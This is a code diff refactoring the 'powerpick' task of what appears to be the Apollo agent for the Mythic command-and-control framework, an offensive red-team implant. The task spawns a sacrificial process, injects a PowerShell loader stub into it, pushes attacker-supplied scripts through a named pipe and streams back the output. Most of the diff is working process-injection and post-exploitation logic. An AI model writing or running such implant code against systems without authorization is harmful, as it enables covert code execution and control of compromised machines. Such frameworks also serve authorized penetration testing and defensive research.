@@ -20,6 +20,7 @@ using System.IO.Pipes;
 using ApolloInterop.Structs.ApolloStructs;
 using ApolloInterop.Classes.Core;
 using ApolloInterop.Classes.Collections;
+using ApolloInterop.Utils;
 
 namespace Tasks
 {
@@ -45,6 +46,7 @@ namespace Tasks
         private Action<object> _flushMessages;
         private ThreadSafeList<string> _assemblyOutput = new ThreadSafeList<string>();
         private bool _completed = false;
+        private System.Threading.Tasks.Task flushTask;
         public powerpick(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
         {
             _sendAction = (object p) =>
@@ -59,7 +61,23 @@ namespace Tasks
                     });
                     if (!_cancellationToken.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
                     {
-                        ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
+                        try
+                        {
+                            ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
+                        }
+                        catch
+                        {
+                            ps.Close();
+                            _complete.Set();
+                            return;
+                        }
+
+                    }
+                    else if (!ps.IsConnected)
+                    {
+                        ps.Close();
+                        _complete.Set();
+                        return;
                     }
                 }
                 ps.Close();
@@ -86,18 +104,36 @@ namespace Tasks
                                 ""));
                     }
                 }
-                output = string.Join("", _assemblyOutput.Flush());
-                if (!string.IsNullOrEmpty(output))
+                while (true)
                 {
-                    _agent.GetTaskManager().AddTaskResponseToQueue(
-                        CreateTaskResponse(
-                            output,
-                            false,
-                            ""));
+                    System.Threading.Tasks.Task.Delay(500).Wait(); // wait 1s
+                    output = string.Join("", _assemblyOutput.Flush());
+                    if (!string.IsNullOrEmpty(output))
+                    {
+                        _agent.GetTaskManager().AddTaskResponseToQueue(
+                            CreateTaskResponse(
+                                output,
+                                false,
+                                ""));
+                    }
+                    else
+                    {
+                        DebugHelp.DebugWriteLine($"no longer collecting output");
+                        return;
+                    }
                 }
             };
         }
-        
+
+        public override void Kill()
+        {
+            _completed = true;
+            _complete.Set();
+            flushTask.Wait();
+            _cancellationToken.Cancel();
+
+        }
+
         public override void Start()
         {
             MythicTaskResponse resp;
@@ -109,106 +145,82 @@ namespace Tasks
                     string.IsNullOrEmpty(parameters.PowerShellParams) ||
                     string.IsNullOrEmpty(parameters.PipeName))
                 {
-                    resp = CreateTaskResponse(
-                        $"One or more required arguments was not provided.",
-                        true,
-                        "error");
+                    throw new ArgumentNullException($"One or more required arguments was not provided.");
                 }
-                else
+                if (!_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] psPic))
                 {
-                    if (_agent.GetFileManager()
-                        .GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId, out byte[] psPic))
-                    {
-                        ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);
-                        proc = _agent.GetProcessManager().NewProcess(info.Application, info.Arguments, true);
-                        if (proc.Start())
-                        {
-                            _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                                "",
-                                false,
-                                "",
-                                new IMythicMessage[]
-                                {
-                                    new Artifact
-                                    {
-                                        BaseArtifact = "ProcessCreate",
-                                        ArtifactDetails = string.IsNullOrEmpty(info.Arguments)
-                                            ? $"Started {info.Application} (PID: {proc.PID})"
-                                            : $"Started {info.Application} {info.Arguments} (PID: {proc.PID})"
-                                    }
-                                }
-                            ));
-                            if (proc.Inject(psPic))
-                            {
-                                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                                    "",
-                                    false,
-                                    "",
-                                    new IMythicMessage[]
-                                    {
-                                        new Artifact
-                                        {
-                                            BaseArtifact = "ProcessInject",
-                                            ArtifactDetails =
-                                                $"Injected into PID {proc.PID} using {_agent.GetInjectionManager().GetCurrentTechnique().Name}"
-                                        }
-                                    }));
-                                string cmd = "";
-                                var loadedScript = _agent.GetFileManager().GetScript();
-                                if (!string.IsNullOrEmpty(loadedScript))
-                                {
-                                    cmd += loadedScript;
-                                }
+                    throw new ExecuteAssemblyException($"Failed to download powerpick loader stub (with id: {parameters.LoaderStubId})");
+                }
 
-                                cmd += "\n\n" + parameters.PowerShellParams;
-                                IPCCommandArguments cmdargs = new IPCCommandArguments
-                                {
-                                    ByteData = new byte[0],
-                                    StringData = cmd
-                                };
-                                AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
-                                client.ConnectionEstablished += Client_ConnectionEstablished;
-                                client.MessageReceived += Client_MessageReceived;
-                                client.Disconnect += Client_Disconnect;
-                                if (client.Connect(10000))
-                                {
-                                    IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
-                                    foreach (IPCChunkedData chunk in chunks)
-                                    {
-                                        _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
-                                    }
-
-                                    _senderEvent.Set();
-                                    _complete.WaitOne();
-                                    _completed = true;
-                                    resp = CreateTaskResponse("", true, "completed");
-                                }
-                                else
-                                {
-                                    resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
-                                }
-                            }
-                            else
-                            {
-                                resp = CreateTaskResponse(
-                                    $"Failed to inject assembly loader into sacrificial process.",
-                                    true,
-                                    "error");
-                            }
-                        }
-                        else
-                        {
-                            resp = CreateTaskResponse($"Failed to start sacrificial process {info.Application}", true, "error");
-                        }
-                    }
-                    else
+                ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);
+                proc = _agent.GetProcessManager().NewProcess(info.Application, info.Arguments, true);
+                try
+                {
+                    if (!proc.Start())
                     {
-                        resp = CreateTaskResponse(
-                            $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
-                            true,
-                            "error");
+                        throw new InvalidOperationException($"Failed to start sacrificial process {info.Application}");
                     }
                 }
+                catch (Exception e)
+                {
+                    throw new ExecuteAssemblyException($"Failed to start '{info.Application}' sacrificial process: {e.Message}");
+                }
+
+                _agent.GetTaskManager().AddTaskResponseToQueue(
+                    CreateTaskResponse("", false, messages:
+                        [
+                            Artifact.ProcessCreate((int)proc.PID, info.Application, info.Arguments)
+                        ]
+                    )
+                );
+                if (!proc.Inject(psPic))
+                {
+                    throw new ExecuteAssemblyException($"Failed to inject powerpick loader into sacrificial process {info.Application}.");
+                }
+                _agent.GetTaskManager().AddTaskResponseToQueue(
+                    CreateTaskResponse("", false, messages:
+                        [
+                            Artifact.ProcessInject((int)proc.PID, _agent.GetInjectionManager().GetCurrentTechnique().Name)
+                        ]
+                    )
+                );
+                string cmd = "";
+                var loadedScript = _agent.GetFileManager().GetScript();
+                if (!string.IsNullOrEmpty(loadedScript))
+                {
+                    cmd += loadedScript;
+                }
+
+                cmd += "\n\n" + parameters.PowerShellParams;
+                IPCCommandArguments cmdargs = new IPCCommandArguments
+                {
+                    ByteData = new byte[0],
+                    StringData = cmd
+                };
+                AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
+                client.ConnectionEstablished += Client_ConnectionEstablished;
+                client.MessageReceived += Client_MessageReceived;
+                client.Disconnect += Client_Disconnect;
+                if (!client.Connect(10000))
+                {
+                    throw new ExecuteAssemblyException($"Injected powershell into sacrificial process: {info.Application}.\n Failed to connect to named pipe: {parameters.PipeName}.");
+                }
+
+                IPCChunkedData[] chunks = _serializer.SerializeIPCMessage(cmdargs);
+                foreach (IPCChunkedData chunk in chunks)
+                {
+                    _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
+                }
+
+                _senderEvent.Set();
+                WaitHandle.WaitAny(new WaitHandle[]
+                {
+                    _cancellationToken.Token.WaitHandle
+                });
+
+                resp = CreateTaskResponse("", true, "completed");
+
+
             }
             catch (Exception ex)
             {
@@ -221,26 +233,24 @@ namespace Tasks
                 proc.Kill();
                 _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", true, "", new IMythicMessage[]
                 {
-                    new Artifact
-                    {
-                        BaseArtifact = "ProcessKill",
-                        ArtifactDetails = $"Killed PID {proc.PID}"
-                    }
+                    Artifact.ProcessKill((int)proc.PID)
                 }));
             }
         }
 
         private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
         {
+            _completed = true;
+            _complete.Set();
+            flushTask.Wait();
             e.Pipe.Close();
             _cancellationToken.Cancel();
-            _complete.Set();
         }
 
         private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
         {
             System.Threading.Tasks.Task.Factory.StartNew(_sendAction, e.Pipe, _cancellationToken.Token);
-            System.Threading.Tasks.Task.Factory.StartNew(_flushMessages, _cancellationToken.Token);
+            flushTask = System.Threading.Tasks.Task.Factory.StartNew(_flushMessages, _cancellationToken.Token);
         }
 
         public void OnAsyncMessageSent(IAsyncResult result)
@@ -249,8 +259,16 @@ namespace Tasks
             // Potentially delete this since theoretically the sender Task does everything
             if (pipe.IsConnected && !_cancellationToken.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] data))
             {
-                pipe.EndWrite(result);
-                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
+                try
+                {
+                    pipe.EndWrite(result);
+                    pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
+                }
+                catch
+                {
+
+                }
+
             }
         }
 
@@ -258,6 +276,7 @@ namespace Tasks
         {
             IPCData d = e.Data;
             string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
+            DebugHelp.DebugWriteLine($"adding data to output");
             _assemblyOutput.Add(msg);
         }
     }
